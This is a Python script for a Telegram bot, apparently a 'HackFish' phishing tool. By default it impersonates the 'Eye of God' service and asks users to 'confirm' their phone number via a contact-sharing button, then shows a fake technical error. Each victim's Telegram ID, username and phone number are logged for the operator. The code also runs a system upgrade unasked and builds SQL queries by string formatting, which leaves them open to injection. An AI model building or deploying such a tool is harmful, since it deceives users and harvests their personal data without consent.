
try:
    from colorama import init
    from colorama import Fore, Back, Style
except:
    os.system('pip install colorama')
    from colorama import init
    from colorama import Fore, Back, Style
print(Fore.GREEN)
print("<HackerRullerTools> Запуск!")
import os
os.system("apt update && apt upgrade")

try:
    from platform import platform
except:
    os.system("pip install platform")
    from platform import platform



puk = platform()[0], platform()[1], platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]


if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'



os.system(delet)




import tracemalloc

from threading import Event

try:
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
except:
    os.system("pip install aiogram")
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
    from aiogram.contrib.fsm_storage.memory import MemoryStorage

try:
    import asyncio
except:
    os.system("pip install asyncio")
    import asyncio

try:
    import requests
except:
    os.system("pip install requests")
    import requests
import time

try:
    from art import *
except:
    os.system("pip install art")
    from art import *

try:
    import sqlite3 as sq
except:
    os.system('pip install sqlite3')
    import sqlite3 as sq



def printtext(text):
    art1 = text2art(text)
    print(art1)
    



def printair(i):
    for l in range(i):
        time.sleep(0.6)
        print()


tracemalloc.start()


storage = MemoryStorage()



bot = None
token = None
dp = None
text1 = None
text2 = None
text3 = None


with sq.connect("configs_hack_fish.db") as con:
    sql = con.cursor()
    sql.execute("CREATE TABLE IF NOT EXISTS configs (config TEXT, text1 TEXT, text2 TEXT, text3 TEXT, token TEXT)")



menu = """1: Вход по токену!
2: Вход по конфигу!"""




def registerbot():
    title()
    print(menu)
    try:
        number_menu = int(input('Введите что хотите выбрать: '))
        if number_menu == 1:
            token_register()
        if number_menu == 2:
            config_register()
    except ValueError:
        error('Введите число!')



def error(text):
    print(Fore.RED)
    os.system(delet)
    printtext('Error')
    print(text)
    time.sleep(3)
    registerbot()
    print(Fore.GREEN)



def error2(text):
    print(Fore.RED)
    os.system(delet)
    printtext('Error')
    print(text)
    print(Fore.GREEN)



def title():
    os.system(delet)
    print(Fore.GREEN)
    printtext('HackFish')

def config_register():
    sql = con.cursor()
    sql.execute(f"SELECT * FROM configs")
    configs = str(sql.fetchone())
    if configs == 'None':
        error('У вас нету конфигов!')
    else:
        while True:
            os.system(delet)
            title()
            print('Введите название конфига!')
            config2 = str(input('Чтобы отменить напишите (back): '))
            if config2 == 'back':
                registerbot()
                break
            con.cursor()
            sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
            if sql.fetchone() is None:
                error2('Этого конфига не существует!')
                time.sleep(3)
                title()
            else:
                global bot
                global token
                global dp
                global text1
                global text2
                global text3
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                token = sql.fetchone()[4]
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                text1 = sql.fetchone()[1]
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                text2 = sql.fetchone()[2]
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                text3 = sql.fetchone()[3]
                os.system(delet)
                title()
                while True:
                    print(f'Если вы хотите другой токен напишите его! Токен конфига: {token}')
                    token2 = input('Пропустите если не хотите его менять: ')
                    if token2 != '':
                        try:
                            bot = Bot(token2)
                            dp = Dispatcher(bot, storage=storage)
                            os.system(delet)
                            title()
                            break
                        except:
                            error2('Введите корректный токен!')
                            time.sleep(3)
                            title()
                    else:
                        bot = Bot(token)
                        dp = Dispatcher(bot, storage=storage)
                        os.system(delet)
                        title()
                        break
                break



def token_register():
    global bot
    global token
    global dp
    global text1
    global text2
    global text3
    os.system(delet)
    while True:
        title()
        token = str(input('Введите токен (чтобы вернутся обратно напишите: back): '))
        if token == 'back':
            registerbot()
        else:
            try:
                bot = Bot(token)
                dp = Dispatcher(bot, storage=storage)
                os.system(delet)
                title()
                print('Введите сообщение которое пишет бот при команде: /start!')
                text1 = str(input('Пропустите чтобы бот представлялся глазом бога: '))
                os.system(delet)
                title()
                print('Введите сообщение кнопки снизу!')
                text2 = str(input('Пропустите чтобы кнопка была как у глаза бога: '))
                os.system(delet)
                title()
                print('Введите сообщение которое бот отправит после получения номера!')
                text3 = str(input('Пропустите чтобы была техническая ошибка: '))
                os.system(delet)
                title()
                if text1 == '':
                    text1 = """🗂 Номер телефона

Вам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию.

Для этого нажмите кнопку ниже."""
                if text2 == '':
                    text2 = '✅ Подтвердить номер телефона'
                if text3 == '':
                    text3 = '❌ Техническая ошибка! Просим извинения!'
                while True:
                    print('Создайте конфиг, напишите название!')
                    config2 = str(input('Пропустите если не хотите создавать конфиг: '))
                    config2 = config2.lower()
                    if config2 == 'back':
                        error2('Неккоректное название конфига!')
                        time.sleep(3)
                        os.system(delet)
                        title()
                    if config2 != '':
                        sql = con.cursor()
                        sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                        if sql.fetchone() is None:
                            sql.execute(f"INSERT INTO configs (config, text1, text2, text3, token) VALUES('{config2}', '{text1}', '{text2}', '{text3}', '{token}')")
                            con.commit()
                            break
                        else:
                            error2('Такой конфиг уже существует!')
                            time.sleep(3)
                            os.system(delet)
                            title()
                    else:
                        os.system(delet)
                        title()
                        break
        

                break
            except:
                error2('Введите корректный токен!')
                time.sleep(3)
                title()
    

registerbot()

follower = types.InlineKeyboardMarkup(row_width=2)
followerbutton1 = types.InlineKeyboardButton(text='Наш Канал 🖤', url='t.me/HackeeRullerToolsOfficial')
followerbutton2 = types.InlineKeyboardButton(text='Наш чат 💤', url='https://t.me/HackerRullerTools')
follower.add(followerbutton1).add(followerbutton2)




contct = ReplyKeyboardMarkup(resize_keyboard=True)
contct.add(
    KeyboardButton(
        text=text2,
        request_contact=True
    )
)




@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    await message.answer(text1, reply_markup=contct)




@dp.message_handler(content_types=['contact'])
async def clicker_test(message: types.Message):
    mt = message.text
    id = message.from_user.id
    us = message.from_user.username
    con = message.contact.phone_number
    print(Fore.YELLOW)
    print(f'Bot > От айди: {id} - псевдонима: @{us}: сообщение: {mt} - номер: {con}')
    print(Fore.GREEN)
    await message.answer(text3, reply_markup=follower)






async def end(_):
    print(Fore.YELLOW)
    print('-----------------------------------------------------------------------------')
    print(Fore.GREEN)
    printtext('BotActive')
    print('\nНаш Канал t.me/HackeeRullerToolsOfficial\nНаш чат https://t.me/HackerRullerTools\n\nЛоги - суда будут приходить номера!\n')
    print(Fore.YELLOW)
    print('-----------------------------------------------------------------------------')
    print(Fore.GREEN)




if __name__ == '__main__':
    executor.start_polling(dp, on_startup=end)
